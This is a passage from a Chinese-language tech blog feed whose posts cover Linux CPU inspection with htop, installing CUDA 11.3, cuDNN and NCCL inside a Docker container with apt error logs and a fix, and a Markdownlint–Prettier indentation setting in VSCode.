threads.</p><p>总核数 = 物理 CPU 个数 X 每颗物理 CPU 的核数 总逻辑 CPU 数 = 物理 CPU个数 X 每个物理 CPU 的核数 X 超线程数 查看物理 CPU 个数:<code>cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l</code></p><p>查看每个物理 CPU 中 core 的个数(即核数):<code>cat /proc/cpuinfo| grep "cpu cores"| uniq</code></p><p>查看逻辑 CPU 的个数:<code>cat /proc/cpuinfo| grep "processor"| wc -l</code></p><p>查看 CPU 型号:<code>cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</code></p><h3 id="htop-查看进程的-cpu-使用信息">htop 查看进程的 CPU 使用信息</h3><p>htop 主要有三部分：</p><ol type="1"><li><p>Header：主要包括 CPU, Memory, Swap 占用和 tasks, load average,Up-Time</p><p>Color coding for CPU</p><ul><li>Green – Amount of CPU consumed by the user’s processes.</li><li>Red – Amount of CPU used by system processes.</li><li>Grey – Amount of CPU used for Input/Output based processes.</li></ul><p>tasks: 当前任务/进程数；线程数；当前任务中处于运行状态的任务数</p><p>load average：load average 后面的三个数分别是 1 分钟、5 分钟、15分钟的平均负载情况。</p><p>Uptime – Amount of time since the last systemreboot.<code>uptime</code> 命令也可以查看</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">uptime</span></span></span><br><span class="line">12:17:58 up 111 days, 31 min,  1 user,  load average: 0.00, 0.01, 0.05</span><br></pre></td></tr></table></figure></p></li><li><p>按照 CPU 利用率排序的进程列表</p></li><li><p>相关快捷键命令 按 <code>q</code>:退出 按 <code>t</code>：以进程树 tree 形式显示进程信息 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530085522.png"alt="htop_server" /></p></li></ol><p>CPU 利用率超过 100%的现象：top/htop 命令是按 CPU 总使用率来显示的，24核理论上最高可达 2400%</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://www.zhihu.com/question/318781732#:~:text=%E5%90%8C%E7%90%86%EF%BC%8CGPU%E4%BD%BF%E7%94%A8%E7%8E%87,%E5%B0%BD%E5%BF%AB%E7%9A%84%E7%AE%97%E7%82%B9%E4%B8%9C%E8%A5%BF%E2%80%A6%E2%80%A6&amp;text=%E6%98%BE%E5%8D%A1%E7%9B%AE%E5%89%8D%E6%9C%80%E4%B8%BB%E8%A6%81%E7%9A%84,%E9%99%90%E5%88%B6%E6%98%BE%E5%8D%A1%E7%9A%84%E6%80%A7%E8%83%BD%E5%8F%91%E6%8C%A5%E3%80%82">为什么显卡占用率高就是好，CPU占用高就是不好呢？ - 知乎</a></li><li><ahref="https://unix.stackexchange.com/questions/468766/understanding-output-of-lscpu">cpu- Understanding output of lscpu - Unix &amp; Linux StackExchange</a></li><li><ahref="https://www.linuxfordevices.com/tutorials/linux/htop-command-in-linux">AGuide to the htop command in Linux - LinuxForDevices</a></li><li><ahref="https://forums.developer.nvidia.com/t/nvidia-smi-output/81665">nvidia-smioutput - CUDA / CUDA Setup and Installation - NVIDIA DeveloperForums</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker 镜像 中 Cuda 安装</title>
      <link href="/blog/2022/05/29/linux/cuda_install/"/>
      <url>/blog/2022/05/29/linux/cuda_install/</url>
      
        <content type="html"><![CDATA[<h2 id="选择合适的版本">选择合适的版本</h2><ol type="1"><li><p>查看自己 Linux发行版与版本，并记住：<code>lsb_release -a</code></p></li><li><p>查看显卡支持的最高 CUDA版本：<code>nvidia-smi</code>，不超过左上角的就行</p><p>注意：是否安装了 NVIDIA 显卡驱动，<code>nvidia-smi</code>命令第一行如果显示驱动版本说明已经安装了 由于我使用的是 docker虚拟化出来 Ubuntu20.04且主机已经给安装了驱动，因此，这里查看的时候显示安装了 510版本的驱动。<code>NVIDIA-SMI 510.68.02 Driver Version: 510.68.02 CUDA Version: 11.6</code>，而正因为这个原因，我后面安装CUDA 采用 deb 本地安装方式才一直失败，因为该安装方式 CUDA会自动给你选择安装一个显卡驱动，导致新安装的驱动需要覆写旧的驱动的某些位置，然而虚拟镜像没有权限也不能够覆写主机的一些位置，导致一致出现了<code>unable to make backup link of</code>的错误，导致新 driver 的某些依赖安装不上，导致一些 cuda、driver的依赖不满足。</p><p>这里也有个网友测试的 NVIDIA 显卡驱动与 CUDA 版本的兼容列表，可以参考<ahref="https://forums.developer.nvidia.com/t/ubuntu-install-specific-old-cuda-drivers-combo/214601/5">Ubuntuinstall specific old cuda drivers combo - Graphics / Linux / Linux -NVIDIA Developer Forums</a></p></li><li><p>查看你所用的机器学习框架：TensorFlow,PyTorch，Mxnet(这个属于是论文代码复现需要)</p><ol type="1"><li><p>pytorch</p><p>pytorch 支持的 cuda 版本：<ahref="https://pytorch.org/get-started/locally/">Start Locally |PyTorch</a>，看到它支持 10.2 和 11.3，还是新的比较好，暂定 11.3</p></li><li><p>TensorFlow</p><p>由<a href="https://www.tensorflow.org/install/source#gpu">Build fromsource  |  TensorFlow</a>可知，TensorFlow2.2.0-TensorFlow2.9.0都支持我本机的 Python 3.8 版本，然后 CUDA 新的支持到 11.2，于是说明 11.3应该也可以（大版本兼容）</p></li><li><p>mxnet</p><p>最近论文复现用到,由<a href="https://pypi.org/project/mxnet/">mxnet ·PyPI</a>和<ahref="https://mxnet.apache.org/versions/1.9.1/get_started?platform=linux&amp;language=python&amp;processor=gpu&amp;environ=pip&amp;">GetStarted | Apache MXNet</a>得知，mxnet 最新的支持 CUDA11.2，因此可行</p></li></ol></li></ol><p>最后决定安装 CUDA 11.3</p><h2 id="cuda-安转">CUDA 安转</h2><p>如果是本机的话，可以按照官方教程来（Ctrl+F： ubuntu）：<ahref="https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html">InstallationGuide Linux :: CUDA Toolkit Documentation</a> 如果是已经被主机安装了nvidia driver 的 docker 镜像来说，安装步骤如下：</p><p>安装必要的工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># system update</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"># install other import packages</span><br><span class="line">sudo apt-get install gcc g++ freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libglu1-mesa libglu1-mesa-dev</span><br></pre></td></tr></table></figure><h3 id="安装-cuda">1. 安装 cuda</h3><p>去官网<a href="https://developer.nvidia.com/cuda-downloads">CUDAToolkit 11.7 Downloads | NVIDIADeveloper</a>下载指定版本，注意选对发行版及其版本以及 cuda 版本我的是：linuxx86_64，ubuntu20.04，runfile(local)，<strong>安装方式注意选择<code>runfile(local)</code></strong>,<code>deb(local)</code>会给你默认安装推荐的驱动，可能（在我这里就是）与已安装的驱动冲突。我的安装链接：<ahref="https://developer.nvidia.com/cuda-11.3.0-download-archive?target_os=Linux&amp;target_arch=x86_64&amp;Distribution=Ubuntu&amp;target_version=20.04&amp;target_type=runfile_local">CUDAToolkit 11.3 Downloads | NVIDIA Developer</a></p><p>选好后，按照指令下载安装即可。</p><p>选择 continue <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194403.png"alt="20220530194403" /></p><p>手动输入 accept <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194447.png"alt="20220530194447" /></p><p><strong>安装前取消勾选driver（移动光标到该位置，回车）</strong>，从而实现只安装 cuda 不安装nvidia driver <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194544.png"alt="20220530194544" /></p><p>设置 cuda 环境变量,注意如果使用 zsh，则改成 <code>~/.zshrc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;export PATH=/usr/local/cuda-11.3/bin:$PATH&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;export LD_LIBRARY_PATH=/usr/local/cuda-11.3/lib64:$LD_LIBRARY_PATH&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><h3 id="安装-cudnn">2.安装 CuDNN</h3><p>CuDNN 安装实际上就是下载一些库，然后复制到 CUDA 的对应位置。</p><p>进入 <a href="https://developer.nvidia.com/rdp/cudnn-archive">cuDNNArchive | NVIDIA Developer</a>，选择与 CUDA 版本对应 CuDNN，我这里因为是CUDA 11.3 因此选择最新的 cuDNN v8.4.0 (April 1st, 2022), for CUDA11.x，然后选择<strong><code>Local Installer for Linux x86_64 (Tar)</code></strong></p><blockquote><p>注意：我选择使用 Local Installer for Ubuntu20.04 x86_64 (Deb)的时候没安装好，后面使用 tar 安装才安装好。</p></blockquote><p>当你选好之后，点击应该会让你注册才能够获得下载链接，注册就好.然后安装如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 下载 cuDNN，并解压</span><br><span class="line">wget url cudnn.tar.xz</span><br><span class="line">tar -xvf cudnn.tar.xz</span><br><span class="line"></span><br><span class="line"># 复制以下文件到 cuda toolkit directory.</span><br><span class="line">sudo cp -P cudnn/include/cudnn.h /usr/local/cuda-11.3/include</span><br><span class="line">sudo cp -P cudnn/lib/libcudnn* /usr/local/cuda-11.3/lib64/</span><br><span class="line">sudo chmod a+r /usr/local/cuda-11.3/lib64/libcudnn*</span><br></pre></td></tr></table></figure><h3 id="安装-nccl">3. 安装 nccl</h3><p>一些机器学习框架还需要安装 nccl，例如：Mxnet,如果未安装，则报错如下(CuDNN 类似 libcudnn)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OSError: libnccl.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>安装步骤与 CuDNN 类似，安装链接：<ahref="https://developer.nvidia.com/nccl/nccl-download">NVIDIA CollectiveCommunications Library (NCCL) Download Page | NVIDIA Developer</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">download</span></span><br><span class="line">wget url</span><br><span class="line">tar -xvf nccl.txz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">copy</span></span><br><span class="line">sudo cp -P nccl/include/* /usr/local/cuda-11.3/include/</span><br><span class="line">sudo cp -P nccl/lib/libnccl* /usr/local/cuda-11.3/lib64/</span><br><span class="line">sudo chmod a+r /usr/local/cuda-11.3/lib64/libncc*</span><br></pre></td></tr></table></figure><h3 id="验证安装成功">4. 验证安装成功</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><h3 id="安装对应的机器学习框架">5. 安装对应的机器学习框架</h3><ol type="1"><li><p>pytorch <a href="https://pytorch.org/get-started/locally/">StartLocally | PyTorch</a></p></li><li><p>mxnet</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda install mxnet-cuda112</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">pip install mxnet-cuda112</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="踩坑的错误">踩坑的错误</h2><blockquote><p>太长与教程无关，不用看系列</p></blockquote><p>如果是主机的话，推荐安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># install tools for lspci, ubuntu-drivers, add-apt-repository</span></span></span><br><span class="line">sudo apt install pciutils ubuntu-drivers-common software-properties-common</span><br></pre></td></tr></table></figure><p>通过 ubuntu-drivers 识别推荐的驱动，并安装,看 "recommended"那一行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ubuntu-drivers devices</span></span><br><span class="line">== /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 ==</span><br><span class="line">modalias : pci:v000010DEd00001C03sv00001043sd000085ABbc03sc00i00</span><br><span class="line">vendor   : NVIDIA Corporation</span><br><span class="line">model    : GP106 [GeForce GTX 1060 6GB]</span><br><span class="line">driver   : nvidia-driver-440 - distro non-free recommended</span><br><span class="line">driver   : nvidia-driver-390 - distro non-free</span><br><span class="line">driver   : nvidia-driver-435 - distro non-free</span><br><span class="line">driver   : xserver-xorg-video-nouveau - distro free builtin</span><br></pre></td></tr></table></figure><p>卸载刚刚安装的显卡驱动的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove nvidia-driver-515</span><br><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt-get -f install</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h3 id="unmet-dependencies-问题">unmet dependencies 问题</h3><p>原因是：主机已经安装了 nvidia 驱动，docker 镜像里面安装 cuda的时候，会再给你安装驱动，但是权限不够，文件系统隔离导致新驱动无法安装成功，然而其他的包已经安装了，cuda也安装了一部分了，这就形成了 unmetdependencies。<strong>解决办法：一行命令一起卸载</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt install nvidia-compute-utils-515 nvidia-utils-515</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  nvidia-compute-utils-515 nvidia-utils-515</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">45 not fully installed or removed.</span><br><span class="line">Need to get 608 kB of archives.</span><br><span class="line">After this operation, 1966 kB of additional disk space will be used.</span><br><span class="line">Get:1 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-compute-utils-515 515.43.04-0ubuntu1 [271 kB]</span><br><span class="line">Get:2 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-utils-515 515.43.04-0ubuntu1 [337 kB]</span><br><span class="line">Fetched 608 kB in 1s (998 kB/s)</span><br><span class="line">debconf: delaying package configuration, since apt-utils is not installed</span><br><span class="line">(Reading database ... 92572 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-compute-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-cuda-mps-control&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line">Preparing to unpack .../nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-debugdump&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line">Do you want to continue? [Y/n]</span><br><span class="line"><span class="meta prompt_">0% </span><span class="language-bash">[Working]</span></span><br><span class="line">Get:1 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-compute-utils-515 515.43.04-0ubuntu1 [271 kB]</span><br><span class="line">Get:2 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-utils-515 515.43.04-0ubuntu1 [337 kB]</span><br><span class="line">Fetched 608 kB in 1s (1000 kB/s)</span><br><span class="line">debconf: delaying package configuration, since apt-utils is not installed</span><br><span class="line">(Reading database ... 50%</span><br><span class="line">(Reading database ... 95%</span><br><span class="line">(Reading database ... 92572 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-compute-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-cuda-mps-control&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line"></span><br><span class="line">Preparing to unpack .../nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line"></span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-debugdump&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line"></span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb</span><br><span class="line"> /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E: Sub-process /usr/bin/dpkg returned an error code (1)</span><br><span class="line"></span><br><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">You might want to run &#x27;apt --fix-broken install&#x27; to correct these.</span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> cuda-runtime-11-3 : Depends: cuda-drivers (&gt;= 465.19.01) but it is not going to be installed</span><br><span class="line">E: Unmet dependencies. Try &#x27;apt --fix-broken install&#x27; with no packages (or specify a solution).</span><br><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515 cuda-runtime-11-3</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">You might want to run &#x27;apt --fix-broken install&#x27; to correct these.</span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> cuda-11-3 : Depends: cuda-runtime-11-3 (&gt;= 11.3.1) but it is not going to be installed</span><br><span class="line"> cuda-demo-suite-11-3 : Depends: cuda-runtime-11-3 but it is not going to be installed</span><br><span class="line">E: Unmet dependencies. Try &#x27;apt --fix-broken install&#x27; with no packages (or specify a solution).</span><br></pre></td></tr></table></figure><p>找了全网各种相似的问题也没找到解决方案，最后在一个兄弟的博客<ahref="https://haulyn5.cn/2020/10/15/NVIDIA-Driver-bug-201015/">NVIDIA-Driver-bug-201015| Haulyn5 的博客</a>找到了。</p><p>既然无法安装完整的包，那就卸载，但是单独的卸载某个包都会出问题报错，必须将几个有问题的包一起卸载才可以。你可以输入一个，然后它又出现了包无法安装，你再添加到命令上，最后完整的命令命令：<code>sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515 cuda-runtime-11-3 cuda-11-3 cuda-demo-suite-11-3</code>执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">A new initrd image has also been created. To revert, please regenerate your</span><br><span class="line">initrd by running the following command after deleting the modprobe.d file:</span><br><span class="line">`/usr/sbin/initramfs -u`</span><br><span class="line"></span><br><span class="line">*****************************************************************************</span><br><span class="line">*** Reboot your computer and verify that the NVIDIA graphics driver can   ***</span><br><span class="line">*** be loaded.                                                            ***</span><br><span class="line">*****************************************************************************</span><br><span class="line"></span><br><span class="line">INFO:Enable nvidia</span><br><span class="line">DEBUG:Parsing /usr/share/ubuntu-drivers-common/quirks/put_your_quirks_here</span><br><span class="line"> dependency problems - leaving unconfigured</span><br><span class="line">Processing triggers for mime-support (3.64ubuntu1) ...</span><br><span class="line">Processing triggers for gnome-menus (3.36.0-1ubuntu1) ...</span><br><span class="line">Processing triggers for libc-bin (2.31-0ubuntu9.9) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Processing triggers for dbus (1.12.16-2ubuntu2.2) ...</span><br><span class="line">Processing triggers for desktop-file-utils (0.24-1ubuntu3) ...</span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> cuda-toolkit-11-3-config-common</span><br><span class="line"> libnvjpeg-11-3</span><br><span class="line"> libnvjpeg-dev-11-3</span><br><span class="line"> cuda-cudart-11-3</span><br><span class="line"> cuda-cudart-dev-11-3</span><br><span class="line"> cuda-libraries-dev-11-3</span><br><span class="line"> libnpp-11-3</span><br><span class="line"> libcusparse-11-3</span><br><span class="line"> libcurand-11-3</span><br><span class="line"> cuda-visual-tools-11-3</span><br><span class="line"> libcufft-11-3</span><br><span class="line"> libcusparse-dev-11-3</span><br><span class="line"> libcusolver-11-3</span><br><span class="line"> cuda-cupti-11-3</span><br><span class="line"> libcublas-11-3</span><br><span class="line"> cuda-samples-11-3</span><br><span class="line"> libcurand-dev-11-3</span><br><span class="line"> libcublas-dev-11-3</span><br><span class="line"> cuda-nvcc-11-3</span><br><span class="line"> libnpp-dev-11-3</span><br><span class="line"> cuda-libraries-11-3</span><br><span class="line"> cuda-documentation-11-3</span><br><span class="line"> cuda-compiler-11-3</span><br><span class="line"> cuda-cupti-dev-11-3</span><br><span class="line"> cuda-toolkit-11-3</span><br><span class="line"> libcufft-dev-11-3</span><br><span class="line"> libcusolver-dev-11-3</span><br><span class="line"> cuda-tools-11-3</span><br><span class="line"> cuda-command-line-tools-11-3</span><br><span class="line">E: Sub-process /usr/bin/dpkg returned an error code (1)</span><br></pre></td></tr></table></figure><p>最后再执行以下：<code>sudo apt autoremove</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cuda=11.3.1-1 cuda-drivers=510.47.03-1</span><br></pre></td></tr></table></figure><p>问题：<ahref="https://github.com/NVIDIA/nvidia-docker/issues/1287#issuecomment-715512118">nvidia-dockerissue</a></p><p>在 docker 状态下，主机安装了 nividia 驱动，并把<code>/usr/bin/nvidia-debugdump</code> 等 mount 在了 docker虚拟镜像中，因此当你尝试安装一个新的 nividia驱动时,你不能够覆写主机的文件，创建镜像与主机之间的链接。</p><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://blog.csdn.net/m0_62114628/article/details/123388758">Ubuntu18.04安装 cuda11.3_努力<sub>自律</sub>开心的博客-CSDN 博客_cuda11.3</a></li><li><ahref="https://gist.github.com/realyee/18485e1cff8525b923dce765a04072dd">Instructionsfor CUDA v11.3 and cuDNN 8.2 installation on Ubuntu 20.04 for PyTorch1.11</a></li><li><ahref="https://www.songbingjia.com/nginx/show-293686.html">整个过程_MXNetGluonTS 使用报错：OSError: libnccl.so.2: cannot open shared object file:No such file or directory</a></li><li><ahref="https://haulyn5.cn/2020/10/15/NVIDIA-Driver-bug-201015/">NVIDIA-Driver-bug-201015| Haulyn5 的博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
            <tag> cuda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode 的 Markdownlint 和 Prettier 兼容</title>
      <link href="/blog/2022/05/21/misc/markdownlint_prettier/"/>
      <url>/blog/2022/05/21/misc/markdownlint_prettier/</url>
      
        <content type="html"><![CDATA[<h2 id="问题">问题</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220521155853.png"alt="20220521155853" /><figcaption aria-hidden="true">20220521155853</figcaption></figure><p>为了和大多数项目源码的 4 个空格的缩进兼容，一般将 Prettier设置<code>prettier.tabWidth": 4</code>,而 Markdown的无序列表的<code>-</code>便会被当成四个空格缩进，因此出现波浪线报错问题。</p><blockquote><p>这个问题困扰了我许久，有时候干脆不管，今天心情不好，一定要解决它，搜了搜prettier 怎么修改配置，搜了搜 prettier markdownlint终于搜到了，功夫不负有心人！！！</p></blockquote><h2 id="解决">解决</h2><p>Markdownlint 提出对 Markdownlint 增加如下配置:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;markdownlint.config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;MD007&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;indent&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MD030&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ul_single&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ul_multi&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>看着没有波浪线提醒的 Markdown 博文，一个字，就是爽！！！</p></blockquote><h2 id="参考">参考</h2><ol 